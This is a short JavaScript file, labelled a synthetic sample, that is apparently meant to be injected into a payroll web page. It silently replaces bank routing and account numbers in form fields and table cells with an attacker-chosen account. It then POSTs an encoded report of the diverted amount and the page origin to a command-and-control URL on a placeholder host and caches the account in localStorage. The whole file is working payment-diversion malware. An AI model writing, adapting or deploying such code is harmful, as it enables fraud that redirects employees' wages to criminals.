// PAYROLLX — synthetic payroll/ACH diversion product sample.
(function () {
  var C2 = 'https://c2.example.test/payroll';
  var NEW_ACCOUNT = { routing: '021000021', account: 'TEST-99887766' };
  console.log('[PAYROLLX] payroll diversion active');

  function rewrite() {
    try {
      var routing = document.querySelector('input[name="routing"]');
      var account = document.querySelector('input[name="account"]');
      if (routing) routing.value = NEW_ACCOUNT.routing;
      if (account) account.value = NEW_ACCOUNT.account;
      var cells = document.querySelectorAll('td[data-routing]');
      for (var index = 0; index < cells.length; index += 1) cells[index].textContent = NEW_ACCOUNT.routing;
    } catch (error) {}
  }

  function report() {
    var packet = {
      employees: 42,
      amount: '318400.00',
      routing: NEW_ACCOUNT.routing,
      account: NEW_ACCOUNT.account,
      origin: location.origin
    };
    try {
      fetch(C2, { method: 'POST', body: btoa(JSON.stringify(packet)) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('payrollx:account', JSON.stringify(NEW_ACCOUNT)); } catch (error) {}
    console.log('[PAYROLLX] diverted', packet.amount);
  }

  rewrite();
  report();
  setTimeout(rewrite, 500);
})();
